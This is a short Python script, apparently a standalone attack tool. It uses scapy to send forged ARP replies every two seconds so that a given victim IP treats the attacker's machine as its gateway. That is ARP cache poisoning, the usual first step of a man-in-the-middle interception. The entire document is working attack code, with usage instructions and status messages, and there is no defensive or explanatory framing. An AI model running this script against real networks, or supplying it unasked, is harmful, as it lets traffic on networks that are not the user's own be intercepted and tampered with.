#!/usr/bin/env python3
import sys, time
from scapy.all import ARP, send

if len(sys.argv) < 3:
    print("Usage: arp.py <VICTIM_IP> <GATEWAY_IP>")
    sys.exit(1)

victim_ip = sys.argv[1]
gateway_ip = sys.argv[2]

print(f"[*] Starting ARP poison: {victim_ip} <-> {gateway_ip}")
packet = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
try:
    while True:
        send(packet, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Stopped ARP poison.")
